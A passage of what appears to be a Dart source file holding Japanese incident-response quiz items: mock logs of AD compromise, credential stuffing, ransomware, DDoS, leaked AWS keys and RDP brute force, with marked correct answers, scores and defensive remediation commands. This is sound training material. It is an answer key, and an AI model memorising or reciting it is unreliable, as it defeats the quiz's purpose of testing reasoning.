          'Golden Ticket（偽の認証チケット）を作成できる状態。',
      nextActions: [
        '【最優先】tanakaアカウントを即時無効化する',
        'Domain Adminsグループの不正追加を削除する',
        'krbtgtアカウントのパスワードを2回変更する（Golden Ticket無効化）',
        '全ドメイン管理者アカウントの認証履歴を確認する',
      ],
      relatedCommands: [
        'Disable-ADAccount -Identity tanaka',
        'Get-ADGroupMember "Domain Admins"',
        'Set-ADAccountPassword krbtgt',
      ],
      studyReference: 'MITRE ATT&CK: T1078 Valid Accounts / T1558.001 Golden Ticket',
    ),
  ),

  Question(
    id: 'q_real_002_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_002',
    prompt:
        'Domain Admins権限の不正取得を確認した。\n'
        'krbtgtパスワードが1年以上更新されていない。\n'
        '次にとるべき最優先の技術的対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'tanakaアカウントのパスワードをリセットする',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '重要な対応ですが、Golden Ticketが既に作成されていた場合、tanakaのPWをリセットしても攻撃者はGolden Ticketで侵入し続けられます。',
      ),
      Choice(
        id: 'b', text: 'krbtgtアカウントのパスワードを2回連続で変更し、tanakaアカウントを無効化する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ Golden Ticket無効化にはkrbtgtを2回変更する必要があります（1回では既存チケットが有効なまま）。同時にtanakaの無効化も必須です。',
      ),
      Choice(
        id: 'c', text: 'ADサーバを再起動する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'AD再起動は重大なサービス影響があり、Golden Ticket無効化の効果もありません。',
      ),
      Choice(
        id: 'd', text: '全社員のパスワードをリセットする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '全社員のPWリセットは業務影響が大きく、Golden Ticket問題の解決にもなりません。まずkrbtgt変更が先です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Golden Ticket攻撃対策には krbtgt アカウントのパスワードを「2回」変更する必要がある。'
          '1回目の変更後も前のチケットが一定時間有効なため、間隔を置いて2回変更する。',
      nextActions: [
        'Set-ADAccountPassword -Identity krbtgt を2回実行（10時間以上間隔を空ける）',
        'Disable-ADAccount -Identity tanaka',
        'Get-ADGroupMember "Domain Admins" で不正な管理者アカウントを確認・除去',
      ],
      relatedCommands: [
        'Set-ADAccountPassword -Identity krbtgt -Reset',
        'Get-ADUser -Filter * -Properties LastLogonDate',
      ],
      studyReference: 'Microsoft: Kerberos Golden Ticket対策 / MITRE ATT&CK T1558',
    ),
  ),

  Question(
    id: 'q_real_002_3',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_002',
    prompt:
        'AD侵害の封じ込めが完了した後、同様の攻撃を防ぐための\n'
        '再発防止策として最も効果的な組み合わせはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '社員へのセキュリティ研修のみ実施する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '研修は重要ですが、技術的な対策（MFA・メールフィルタ）と組み合わせないと再発リスクが残ります。',
      ),
      Choice(
        id: 'b', text: 'MFA（多要素認証）の全社導入 + メール添付ファイルのサンドボックス検査 + EDR導入',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ MFAで認証情報盗取後の侵入を防ぎ、サンドボックスで悪意あるファイルを検出し、EDRで侵害後の横展開を早期検知する三重防御が効果的です。',
      ),
      Choice(
        id: 'c', text: 'ファイアウォールのルールを厳しくする',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'FWルール強化は有効ですが、フィッシングはメール経由で内部に侵入するため、内部のAD保護・MFA・EDRが本質的な対策です。',
      ),
      Choice(
        id: 'd', text: 'パスワードの最低文字数を8文字から12文字に変更する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'パスワード強度強化は有効ですが、フィッシングは正規のパスワードを盗むため、長くしても根本対策にはなりません。MFAが本質的な対策です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'フィッシング攻撃への三重防御: '
          '①MFA（認証情報を盗まれても侵入できない）'
          '②メールサンドボックス（悪意あるファイルを開封前に検出）'
          '③EDR（侵入後の異常な動作をリアルタイム検知）。',
      nextActions: [
        'Azure AD / Google Workspace で条件付きアクセスとMFAを有効化',
        'メールゲートウェイにサンドボックス機能を追加',
        'CrowdStrike/SentinelOne等のEDRを全端末に導入',
        'AD Tierモデルの導入',
      ],
      relatedCommands: [
        'Get-MgUser -Filter "assignedLicenses/any()"',
        'Test-MxRecord -DomainName corp.example.com',
      ],
      studyReference: 'NIST SP 800-63B: MFA実装ガイドライン / Microsoft DART incident guide',
    ),
  ),

  // ━━ s_real_004: リスト型攻撃 ━━━━━━━━━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_004_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_004',
    prompt: 'ECサイトの認証APIのアクセスログを確認してください。何が起きていますか？',
    logLines: [
      'Sep 20 03:12:00 API-GW POST /auth/login 200 user=aaa@example.com src=45.142.212.100',
      'Sep 20 03:12:01 API-GW POST /auth/login 401 user=bbb@example.com src=45.142.212.100',
      'Sep 20 03:12:01 API-GW POST /auth/login 401 user=ccc@example.com src=45.142.212.100',
      'Sep 20 03:12:02 API-GW POST /auth/login 200 user=ddd@example.com src=45.142.212.100',
      '...',
      'Sep 20 03:12:59 API-GW [SUMMARY] src=45.142.212.100',
      '  requests=8,420 success=1,247 fail=7,173 (in 60sec)',
    ],
    choices: [
      Choice(
        id: 'a', text: 'APIサーバが過負荷によりエラーを返している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '200（成功）と401（認証失敗）が混在しています。過負荷なら503 Service Unavailableが多数出ます。',
      ),
      Choice(
        id: 'b', text: '同一IPアドレスから大量のID/パスワードの組み合わせを試すリスト型攻撃が行われており、1,247件の不正ログインが成功している',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 1つのIPから60秒間に8,420回の認証試行、1,247件が成功（200）しています。リスト型攻撃（Credential Stuffing）の典型パターンです。',
      ),
      Choice(
        id: 'c', text: 'SQLインジェクション攻撃が行われている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'SQLインジェクションなら /auth/login 以外のエンドポイントへの攻撃や特殊文字のリクエストが見られます。',
      ),
      Choice(
        id: 'd', text: 'セール開催によるアクセス集中',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '正規のアクセス集中なら同一IPからの集中ではなく、多数のIPから分散したアクセスになります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Credential Stuffing（リスト型攻撃）: 他サービスから流出したID/パスワードのリストを使い、'
          '別サービスに機械的にログインを試みる攻撃。'
          'パスワードを使い回しているユーザーが被害を受ける。',
      nextActions: [
        '45.142.212.100をACLでブロックする',
        'レート制限をAPIゲートウェイに設定する',
        '成功した1,247アカウントを特定して一時ロックし、パスワードリセットを要求する',
        '個人情報保護委員会・警察への報告',
      ],
      relatedCommands: [
        'ip access-list extended BLOCK-ATTACK',
        ' deny ip host 45.142.212.100 any',
      ],
      studyReference: 'OWASP: Credential Stuffing対策 / 個人情報保護委員会「漏洩時の報告義務」',
    ),
  ),

  Question(
    id: 'q_real_004_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_004',
    prompt:
        'リスト型攻撃で1,247件のアカウントへの不正アクセスが成功した。\n'
        '再発防止のための最も効果的な対策はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'パスワードの最低文字数を10文字に変更する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'リスト型攻撃では正規のパスワードを使います。文字数変更は無意味です。',
      ),
      Choice(
        id: 'b', text: 'MFA導入 + 認証試行のレート制限 + パスワード流出チェック（HIBP連携）の三点セット',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ MFAで盗んだパスワードだけでは侵入不可、レート制限で大量試行を防止、HIBPで流出済みパスワードの使用を禁止する三重対策が効果的です。',
      ),
      Choice(
        id: 'c', text: '海外IPからのアクセスを全てブロックする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '国内ユーザーが海外旅行中にアクセスできなくなるなど業務・利便性への影響が大きいです。',
      ),
      Choice(
        id: 'd', text: 'ユーザーに「他サービスと同じパスワードを使わないように」とメールを送る',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '啓発は重要ですが、ユーザーに依存した対策では限界があります。技術的な対策と組み合わせる必要があります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'リスト型攻撃への三点セット: '
          '①MFA（パスワードが正しくても第2認証要素が必要）'
          '②レート制限（1IP・1分間N回を超えたらブロック・CAPTCHA表示）'
          '③HIBP連携（Have I Been Pwnedに登録済みのパスワードは使用不可）。',
      nextActions: [
        'API GatewayにRate Limiting（例: 10回/分/IP）を設定',
        'ログイン画面にreCAPTCHA v3を導入',
        'HIBP APIとの連携でパスワード流出チェック',
        '不正アクセスされた1,247アカウントへの個別通知（法的義務）',
      ],
      relatedCommands: [
        'curl -s https://api.pwnedpasswords.com/range/{SHA1prefix}',
        'nginx: limit_req_zone / limit_req',
      ],
      studyReference: 'OWASP ASVS Level 2: 認証要件 / Troy Hunt「HIBP」API仕様',
    ),
  ),

  // ━━ s_real_005: 港湾ランサムウェア ━━━━━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_005_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_005',
    prompt: '港湾のコンテナ管理システムのSyslogを確認してください。',
    logLines: [
      'Jul 04 05:30:11 NUTS-SERVER %SYS-2-CRIT: Service NUTS-Core stopped unexpectedly',
      'Jul 04 05:30:15 NUTS-SERVER %FS-3-ENCRYPT: Mass encryption detected',
      '  /nuts/container_data/*.db → *.db.locked (1,024 files)',
      'Jul 04 05:31:00 CRANE-CTL-01 %CTRL-4-COMM: Communication lost with NUTS-SERVER',
      'Jul 04 05:31:00 CRANE-CTL-02 %CTRL-4-COMM: Communication lost with NUTS-SERVER',
      'Jul 04 05:31:05 GATE-SYS-01 %GATE-3-FAIL: Cannot validate container entry',
      '  NUTS-SERVER unreachable - gate operations suspended',
    ],
    choices: [
      Choice(
        id: 'a', text: 'サーバのハードウェアが故障してシステムが停止した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ハードウェア故障ではファイルの暗号化（*.db.locked）は発生しません。',
      ),
      Choice(
        id: 'b', text: 'ランサムウェアがコンテナ管理DBを暗号化し、クレーン・ゲートを含む港湾全体の運営が停止した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ NUTSサーバのDBが暗号化され、クレーン制御・ゲートシステムがすべてNUTSに依存しているため連鎖的に機能停止。名古屋港の実際の事例と同じパターンです。',
      ),
      Choice(
        id: 'c', text: 'ネットワーク障害でサーバへのアクセスが切断された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ネットワーク障害ならサーバ側ではなくスイッチやルーターのログにダウンが出ます。',
      ),
      Choice(
        id: 'd', text: 'コンテナ数の超過によりデータベースが満杯になった',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DB容量超過ならINSERT失敗のエラーが出ます。.lockedへのリネームはランサムウェアの典型的な動作です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '名古屋港統一ターミナルシステム（NUTS）への2023年7月のランサムウェア攻撃と同様のシナリオ。'
          'OT（運用技術）環境がITネットワークと繋がっていたことが被害拡大の原因。',
      nextActions: [
        'NUTSサーバをネットワークから即時分離する',
        'クレーン・ゲートシステムを手動運用モードに切り替えできるか確認する',
        '最後のクリーンなバックアップからの復元可能性を確認する',
        '港湾運営会社・行政・警察・JPCERT/CCに報告する',
      ],
      relatedCommands: [
        'interface GigabitEthernet0/0',
        ' shutdown  (OTセグメントのネットワーク分離)',
        'show ip route',
      ],
      studyReference: 'ICS-CERT「OT環境のランサムウェア対策」',
    ),
  ),

  Question(
    id: 'q_real_005_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_005',
    prompt:
        '港湾システム停止から30分が経過。クレーンが停止して作業員が待機している。\n'
        '復旧の優先順位として最も適切なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '感染したサーバのOSを再インストールしてからシステムを再起動する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'OS再インストールは数時間かかり、その間作業が止まります。まず手動運用への切り替えで部分復旧を優先します。',
      ),
      Choice(
        id: 'b', text: '手動運用に切り替えて部分的な作業を再開しながら、バックアップからの復旧を並行して進める',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 完全復旧を待つより、手動・紙ベースでの部分運用を先行させて影響を最小化します。',
      ),
      Choice(
        id: 'c', text: '身代金を支払って復号キーを入手し、即座にシステムを復旧する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金支払いで復旧できる保証はなく（50%以下）、手動運用による暫定復旧が先です。',
      ),
      Choice(
        id: 'd', text: 'システムが完全に復旧するまで港湾全体の業務を停止し続ける',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '完全停止のまま復旧を待つと経済的損失が拡大します。手動運用が可能な範囲で業務継続を試みるのがBCPの基本です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'OT環境でのランサムウェア対応のBCP原則: '
          '①手動運用への切り替え → ②バックアップからの復旧 → ③システム検証後に再接続。',
      nextActions: [
        '手動コンテナ管理への切り替え手順を担当者に指示',
        '最新クリーンバックアップからの復元作業開始',
        '復元後にウイルススキャン・脆弱性診断を実施してから本番接続',
      ],
      relatedCommands: [
        'vlan 100 name OT-NETWORK',
        'vlan 200 name IT-NETWORK',
        ' ip access-group OT-POLICY in',
      ],
      studyReference: 'NIST SP 800-82: OT環境のセキュリティガイド',
    ),
  ),

  // ━━ s_real_006: DDoS→金融サービス停止 ━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_006_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_006',
    prompt: '年末年始の1月3日深夜、銀行Webシステムの監視アラートを確認してください。',
    logLines: [
      'Jan 03 23:48:11 LB-01 %NET-4-THRESHOLD: Inbound traffic spike',
      '  interface: WAN-uplink rate=98Gbps (threshold: 10Gbps)',
      'Jan 03 23:48:15 WAF-01 %WAF-3-BLOCK: DDoS signature matched',
      '  attack_type=HTTP_FLOOD src_count=142,000 rps=8,500,000',
      'Jan 03 23:48:20 WEB-01 %HTTP-3-OVERLOAD: Connection queue full',
      '  active_conn=500000/500000 new_conn_rejected=true',
      'Jan 03 23:48:25 MON-01 [ALERT] Internet Banking: UNREACHABLE',
      '  external_probe: timeout from 5/5 locations',
    ],
    choices: [
      Choice(
        id: 'a', text: '年明けのアクセス集中でサーバが過負荷になっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '正常なアクセス集中では98Gbps（通常の10倍）は発生しません。14万2千の送信元から850万rpsはDDoS攻撃の規模です。',
      ),
      Choice(
        id: 'b', text: '14万以上のIPから850万リクエスト/秒のDDoS攻撃を受け、インターネットバンキングが利用不能になっている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 98Gbpsの異常なトラフィック、14万IPからの攻撃、接続キューの完全枯渇 — 典型的なDDoSによるサービス停止です。',
      ),
      Choice(
        id: 'c', text: 'ランサムウェアが決済サーバに感染した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ランサムウェアならファイル暗号化のログが出ます。ここでは大量のネットワークトラフィックとHTTPコネクション枯渇が原因です。',
      ),
      Choice(
        id: 'd', text: 'データセンターの電源が落ちた',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '電源障害ならサーバが停止してログも出ません。WAF・LB・Webサーバが動作しながら過負荷状態になっています。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '2024〜2025年の年末年始に実際に発生したDDoS攻撃を模した問題。'
          '三井住友銀行・みずほ銀行等の大手金融機関が同時に攻撃を受けた。'
          '帰省・旅行の繁忙期に合わせた計画的な攻撃タイミング。',
      nextActions: [
        '上流ISPにBGPブラックホール（null-route）を依頼',
        'クラウドDDoS緩和サービス（Cloudflare・Akamai等）にトラフィックを迂回',
        'WAFのレート制限を最大限強化する',
        '金融庁・JPCERT/CCへの報告',
      ],
      relatedCommands: [
        'ip route 0.0.0.0 0.0.0.0 Null0  (緊急ブラックホール)',
        'show interfaces WAN rate',
      ],
      studyReference: 'JPCERT/CC「DDoS攻撃への対応」/ 金融庁「サイバーセキュリティ管理基準」',
    ),
  ),

  Question(
    id: 'q_real_006_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_006',
    prompt:
        '年末年始のDDoS攻撃を経験した後、来年の同時期に向けて\n'
        '最も効果的な準備はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '年末年始のみ24/365のSOCを一時的に稼働させる',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '長期休暇前後は重要ですが、攻撃はいつでも発生します。常時監視体制の構築が本質的な対策です。',
      ),
      Choice(
        id: 'b', text: 'クラウドDDoS緩和サービスの導入 + 上流ISPとのブラックホール合意 + 24/365 SOC体制の確立',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 平時からクラウドDDoS緩和サービスを導入し、ISPとのブラックホール手順を合意し、常時監視体制を作っておくことが最も効果的です。',
      ),
      Choice(
        id: 'c', text: 'サーバのスペックを10倍にアップグレードする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoS攻撃はスケールアップで対処できません。さらに大きな攻撃が来れば同じ結果になります。',
      ),
      Choice(
        id: 'd', text: '国内IPのみアクセスを許可して海外からの接続を全てブロックする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoS攻撃は国内のボットネットも使います。海外在住の顧客や国内VPN経由の攻撃に対応できません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'DDoS対策の多層防御: '
          '①クラウドDDoS緩和（Anycastによる分散吸収）'
          '②ISPレベルのブラックホール（平時から手順を合意）'
          '③24/365 SOCによる早期検知・対応。',
      nextActions: [
        'Cloudflare / Akamai / AWS Shield等のDDoS緩和サービスを契約',
        'ISPと「緊急ブラックホール手順」を事前に合意',
        'SIEM/SOCでトラフィック異常を24/365で監視',
        'DDoS発生時のエスカレーションフローを文書化',
      ],
      relatedCommands: [
        'show interface WAN',
        'snmp-server trap link ietf',
      ],
      studyReference: 'Cloudflare「DDoSレポート2024」/ JPCERT/CC「DDoS対策ガイド」',
    ),
  ),

  // ━━ s_real_009: クラウドIAM不正利用 ━━━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_009_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_009',
    prompt: 'AWSのCloudTrailログを確認してください。何が起きていますか？',
    logLines: [
      '2025-03-15T02:14:33Z cloudtrail iam-user=deploy-bot',
      '  event=DeleteObject bucket=prod-data-2024',
      '  object_count=1 src_ip=45.77.142.100 (AS20473 Vultr)',
      '2025-03-15T02:14:34Z cloudtrail iam-user=deploy-bot',
      '  event=DeleteObjects bucket=prod-data-2024',
      '  object_count=1000 (batch delete)',
      '2025-03-15T02:14:35Z cloudtrail iam-user=deploy-bot',
      '  event=DeleteObjects bucket=backup-2024',
      '  object_count=1000 (batch delete)',
      '  [ALERT] Unusual location: src_ip previously from 203.0.113.10 (JP)',
    ],
    choices: [
      Choice(
        id: 'a', text: 'S3バケットのライフサイクルポリシーによる自動削除',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ライフサイクルポリシーはAWSサービス自身が実行します。今回はIAMユーザー「deploy-bot」が手動削除しており、送信元IPが過去と異なります。',
      ),
      Choice(
        id: 'b', text: 'deploy-botのIAMアクセスキーが漏洩し、海外から不正に使用されてS3の本番・バックアップデータが削除されている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 平時は日本のIPから使用されていたdeploy-botが、海外VPSサーバ（Vultr）から突然大量削除を実行。アクセスキーの漏洩・不正利用の典型的なパターンです。',
      ),
      Choice(
        id: 'c', text: 'S3バケットの容量が上限に達してファイルが削除された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'S3に容量上限はありません。',
      ),
      Choice(
        id: 'd', text: 'CI/CDパイプラインのデプロイスクリプトが誤ってデータを削除した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'CI/CDなら通常のIPから実行されるはずです。海外VPS（Vultr）からの実行は正規のパイプラインではありません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'エネクラウド株式会社への2025年の実際の攻撃と同様のシナリオ。'
          'IAMユーザーのアクセスキーがGitHubへの誤コミット等で漏洩し、'
          '攻撃者がそのキーを使ってS3バケットのデータを削除。',
      nextActions: [
        '【即時】deploy-botのIAMアクセスキーを無効化・削除する',
        'S3バケットのバージョニングが有効か確認',
        'CloudTrailで過去30日間のdeploy-botの全操作を確認',
        '個人情報保護委員会へのインシデント報告',
      ],
      relatedCommands: [
        'aws iam update-access-key --access-key-id AKIAIOSFODNN7 --status Inactive',
        'aws s3api list-object-versions --bucket prod-data-2024',
        'aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=deploy-bot',
      ],
      studyReference: 'AWS「IAMベストプラクティス」/ エネクラウドインシデント報告書 2025',
    ),
  ),

  Question(
    id: 'q_real_009_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_009',
    prompt:
        'S3データ削除インシデント後、同様の事故を防ぐための\n'
        'IAMセキュリティ改善として最も効果的なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'アクセスキーのパスワードを複雑にする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IAMアクセスキーはパスワードではなくKeyID+SecretKeyのペアです。ローテーション・スコープ制限が重要です。',
      ),
      Choice(
        id: 'b', text: 'アクセスキーの90日自動ローテーション + S3削除権限の分離 + CloudTrail異常検知アラート設定',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 定期ローテーションで漏洩キーの有効期間を短縮、権限分離でバックアップへの同一キーアクセスを防止、CloudTrailアラートで異常な削除を即時検知します。',
      ),
      Choice(
        id: 'c', text: 'S3バケットを全て非公開（Private）に設定する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '非公開設定は重要ですが、IAMキーを持つ攻撃者には有効ではありません。',
      ),
      Choice(
        id: 'd', text: 'バックアップを毎日取る',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'バックアップ頻度増加は有効ですが、同じIAMキーでバックアップも削除できる構成では意味がありません。権限分離が先です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'クラウドIAM安全管理の三原則: '
          '①最小権限（S3:DeleteObjectは必要な場合のみ付与）'
          '②定期ローテーション（90日以内にアクセスキーを更新）'
          '③異常検知（CloudTrailで地理的異常・大量削除を即時アラート）。',
      nextActions: [
        'aws iam create-access-key で新キーを作成し、旧キーを無効化',
        'S3バケットのバージョニングとMFA Delete を有効化',
        'CloudTrail + EventBridge でDeleteObjects検知アラートを設定',
        'バックアップバケットには専用の別IAMユーザー（削除不可ポリシー）を使用',
      ],
      relatedCommands: [
        'aws s3api put-bucket-versioning --bucket prod-data-2024 --versioning-configuration Status=Enabled',
        'aws iam generate-credential-report',
      ],
      studyReference: 'AWS Well-Architected Framework: セキュリティの柱 / CIS AWS Benchmark',
    ),
  ),

  // ━━ s_real_011: ファイアウォール設定ミス ━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_011_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_011',
    prompt:
        '大学ネットワークの監視ツールが以下のアラートを出した。\n'
        '8月の設定変更から2ヶ月間、何が起きていたか判断してください。',
    logLines: [
      '# 8月13日 FW設定変更ログ',
      'Aug 13 14:30:22 FW-UNIV %FW-6-CONFIG: Rule updated by admin',
      '  rule_id=201 OLD: deny any 10.0.0.0/8 any',
      '  rule_id=201 NEW: permit any 10.0.0.0/8 any',
      '  ← ルール条件が誤って逆転',
      '',
      '# 10月4日 侵入検知',
      'Oct 04 02:14:11 IDS-01 %IDS-2-ALERT: Ransomware signature detected',
      '  src=198.51.100.44 (CN) target=SERVER-1 (10.0.0.10)',
      '  method=direct_access_no_auth duration=52days',
    ],
    choices: [
      Choice(
        id: 'a', text: 'IDS機器の誤検知でアラートが出ている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'duration=52daysは52日間にわたる実際のアクセスを示しています。8月13日のFWルール変更（deny→permit）との相関から実際の侵害です。',
      ),
      Choice(
        id: 'b', text: 'FWのルール設定ミスでdeny/permitが逆転し、2ヶ月間インターネットから直接アクセス可能になっていた',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 8月13日にFWルールがdeny→permitに誤って変更され、52日間外部から認証なしで10.0.0.0/8へのアクセスが可能だった。東海大の実例と同様です。',
      ),
      Choice(
        id: 'c', text: 'IDSの定義ファイルが古く、新しい攻撃手法に対応できていない',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IDSはRansomware signatureを検知しています。問題はFWルールの設定ミスにより外部からの直接アクセスが52日間許可されていたことです。',
      ),
      Choice(
        id: 'd', text: '内部の学生がサーバに不正アクセスした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '送信元は198.51.100.44（CN）です。内部からのアクセスではありません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '東海国立大学機構での実際のインシデント（2022年）を模したシナリオ。'
          '8月のFWファームウェア更新時に設定ミスが発生し、deny→permitに誤って変更されたルールが2ヶ月間気づかれなかった。',
      nextActions: [
        '【即時】FWルールを正しいdenyに戻す',
        '52日間のアクセスログを全て確認して侵害範囲を特定',
        'SERVER-1をネットワークから分離してマルウェアスキャン',
        '設定変更プロセスの見直し（変更前後のテスト・4眼確認の義務化）',
      ],
      relatedCommands: [
        'show access-lists',
        'ip access-list extended INTERNAL-PROTECT',
        ' deny ip any 10.0.0.0 0.255.255.255',
      ],
      studyReference: 'ITIL: 変更管理プロセス / CIS Control 11',
    ),
  ),

  Question(
    id: 'q_real_011_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_011',
    prompt:
        'FW設定ミスを防ぐために導入すべき変更管理プロセスとして\n'
        '最も効果的なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'FW設定の変更は担当者1人で行い、作業後に上長に報告する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '1人で変更・1人でチェックでは同じミスが発生します。2人以上での確認（4眼確認）が必要です。',
      ),
      Choice(
        id: 'b', text: '変更後に自動テスト（脆弱性スキャン + ACL検証）を実施し、4眼確認（2名以上）を義務化する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 変更後に自動でポリシーを検証し、担当者+レビュアーの2名確認で見落としを防止します。',
      ),
      Choice(
        id: 'c', text: 'FW設定の変更を年1回の定期メンテナンスのみに制限する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '変更頻度を下げるより、変更の品質を担保するプロセスが重要です。緊急対応できなくなるデメリットもあります。',
      ),
      Choice(
        id: 'd', text: 'FW機器を最新モデルに更新する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '機器の更新は脆弱性対策には有効ですが、設定ミスはどんな機器でも起こります。プロセス・人的管理が本質的な対策です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'FW設定変更管理の基本: '
          '①変更前: 変更内容の文書化・影響範囲の評価'
          '②変更後: 自動検証スクリプト'
          '③4眼確認: 担当者+別のエンジニアがルールを独立して確認。',
      nextActions: [
        '変更管理手順書の作成',
        'Nmap/Nessusによる変更後の自動脆弱性スキャンをCI/CDに組み込む',
        'FW設定をGit管理（変更差分を自動でレビュー）',
        '定期的なFWルールの棚卸し',
      ],
      relatedCommands: [
        'nmap -sA -p 0-65535 10.0.0.0/24',
        'diff fw-rules-before.txt fw-rules-after.txt',
      ],
      studyReference: 'ITIL v4: 変更管理 / NIST SP 800-53: CM-3',
    ),
  ),

  // ━━ s_real_015: RDP開放→ランサムウェア ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_015_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_015',
    prompt: '中小製造業のWindowsサーバのイベントログを確認してください。',
    logLines: [
      'EventID 4625 (Failed Logon) x 14,200 in 2 hours',
      '  account=Administrator src=185.220.101.50 (Tor Exit Node)',
      '  logon_type=10 (RemoteInteractive = RDP)',
      '',
      'EventID 4624 (Successful Logon)',
      '  account=Administrator src=185.220.101.50',
      '  time=04:33:12 (after 14,200 failed attempts)',
      '',
      'EventID 7045 (New Service Installed)',
      '  service_name=WindowsUpdateService',
      '  binary_path=C:\\Users\\Public\\svchost.exe  ← 偽装',
    ],
    choices: [
      Choice(
        id: 'a', text: 'Windows Updateが自動で適用された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Windows Updateは14,200回のログイン失敗の後に実行されません。Torノードからのブルートフォース後のサービス登録は攻撃者の持続化手法です。',
      ),
      Choice(
        id: 'b', text: 'RDPへのブルートフォースでAdministratorに不正ログインし、攻撃者が偽装サービスを登録して永続化した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 14,200回の失敗後に成功（ブルートフォース成功）、TorノードはVPN代わりに使われます。偽のWindowsUpdateServiceはマルウェアの永続化手法です。',
      ),
      Choice(
        id: 'c', text: 'ネットワーク管理者がリモートから設定変更した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '正規の管理者が14,200回ログイン失敗することはありません。またTorノードは正規業務では使いません。',
      ),
      Choice(
        id: 'd', text: 'ウイルス対策ソフトがマルウェアを検出してブロックした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ウイルス対策がブロックした場合、ログイン成功やサービス登録は発生しません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '中小企業に多いRDP直接公開（ポート3389をインターネットに開放）によるランサムウェア感染の典型例。'
          '警察庁の調査では、ランサムウェアの感染経路の83%がVPN/RDP経由。',
      nextActions: [
